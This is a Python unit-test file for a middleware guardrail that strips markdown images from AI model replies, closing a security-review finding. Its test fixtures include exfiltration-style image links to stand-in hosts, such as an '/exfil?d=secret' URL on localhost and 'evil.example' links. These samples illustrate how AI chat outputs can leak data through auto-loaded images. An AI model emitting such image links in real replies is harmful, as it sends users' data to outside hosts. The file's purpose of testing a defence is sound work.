"""Unit tests for step 4.2 of SECURITY_IMPLEMENTATION_PLAN.md — OutputImageGuardrailMiddleware
(core/middleware.py), closing SECURITY_REVIEW.md finding #6 (confirmed live in step 4.1).
No Ollama needed — calls wrap_model_call/awrap_model_call directly against a fake handler
that returns a scripted AIMessage/ModelResponse, the same way LangChain's ToolNode would.

Run with: python tests/test_output_image_guardrail.py
"""
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from langchain.agents.middleware.types import ModelResponse
from langchain_core.messages import AIMessage

import core.middleware as mw

_FAILURES: list[str] = []


def check(label: str, condition: bool) -> None:
    status = "PASS" if condition else "FAIL"
    print(f"[{status}] {label}")
    if not condition:
        _FAILURES.append(label)


def handler_returning_ai_message(text: str):
    def _handler(request):
        return AIMessage(content=text)
    return _handler


async def async_handler_returning_ai_message(text: str):
    async def _handler(request):
        return AIMessage(content=text)
    return _handler


def test_clean_reply_passes_through_unchanged():
    middleware = mw.OutputImageGuardrailMiddleware()
    text = "The Transformer uses multi-head self-attention. See [the paper](https://arxiv.org/abs/1706.03762)."
    result = middleware.wrap_model_call(None, handler_returning_ai_message(text))
    check("clean reply unchanged", result.content == text)
    check("plain markdown link (not an image) is untouched", "arxiv.org" in result.content)


def test_markdown_image_is_stripped():
    middleware = mw.OutputImageGuardrailMiddleware()
    text = 'Here is the figure: ![ref](http://127.0.0.1:8999/exfil?d=secret) as described.'
    result = middleware.wrap_model_call(None, handler_returning_ai_message(text))
    check("image markdown removed", "![ref]" not in result.content)
    check("URL removed", "127.0.0.1:8999" not in result.content)
    check("placeholder present", "[blocked:" in result.content)
    check("surrounding text preserved", "Here is the figure:" in result.content and "as described." in result.content)


def test_multiple_images_all_stripped():
    middleware = mw.OutputImageGuardrailMiddleware()
    text = "![a](http://evil.example/a) middle text ![b](http://evil.example/b \"title\")"
    result = middleware.wrap_model_call(None, handler_returning_ai_message(text))
    check("no image syntax remains", "![" not in result.content)
    check("both URLs removed", "evil.example" not in result.content)
    check("middle text preserved", "middle text" in result.content)


def test_image_with_title_attribute_is_stripped():
    middleware = mw.OutputImageGuardrailMiddleware()
    text = '![alt text](https://example.com/x.png "a title")'
    result = middleware.wrap_model_call(None, handler_returning_ai_message(text))
    check("image with title attribute removed", "![alt text]" not in result.content and "example.com" not in result.content)


def test_empty_or_none_content_does_not_crash():
    middleware = mw.OutputImageGuardrailMiddleware()
    result = middleware.wrap_model_call(None, handler_returning_ai_message(""))
    check("empty content handled without crash", result.content == "")


def test_model_response_wrapper_shape_is_handled():
    """The response can also be a ModelResponse wrapping several messages
    (e.g. after a tool-calling round), not just a bare AIMessage."""
    middleware = mw.OutputImageGuardrailMiddleware()

    def handler(request):
        return ModelResponse(result=[
            AIMessage(content="intermediate, no image"),
            AIMessage(content="final: ![x](http://evil.example/x)"),
        ])

    result = middleware.wrap_model_call(None, handler)
    final = mw._final_ai_message(result)
    check("ModelResponse final message sanitized", "evil.example" not in final.content)
    check("placeholder present in ModelResponse path", "[blocked:" in final.content)


def test_async_path_matches_sync():
    middleware = mw.OutputImageGuardrailMiddleware()

    async def handler(request):
        return AIMessage(content="![x](http://evil.example/x)")

    result = asyncio.run(middleware.awrap_model_call(None, handler))
    check("async: image stripped", "evil.example" not in result.content)
    check("async: placeholder present", "[blocked:" in result.content)


def test_non_ai_message_response_passes_through():
    """A response with no AIMessage at all (e.g. None, or something unrelated) must
    not crash — _final_ai_message returns None and the middleware backs off."""
    middleware = mw.OutputImageGuardrailMiddleware()
    sentinel = "not a message at all"
    result = middleware.wrap_model_call(None, lambda request: sentinel)
    check("non-AIMessage response passed through unchanged", result is sentinel)


if __name__ == "__main__":
    test_clean_reply_passes_through_unchanged()
    test_markdown_image_is_stripped()
    test_multiple_images_all_stripped()
    test_image_with_title_attribute_is_stripped()
    test_empty_or_none_content_does_not_crash()
    test_model_response_wrapper_shape_is_handled()
    test_async_path_matches_sync()
    test_non_ai_message_response_passes_through()

    print()
    if _FAILURES:
        print(f"{len(_FAILURES)} check(s) FAILED:")
        for f in _FAILURES:
            print(f"  - {f}")
        sys.exit(1)
    else:
        print("All checks passed.")
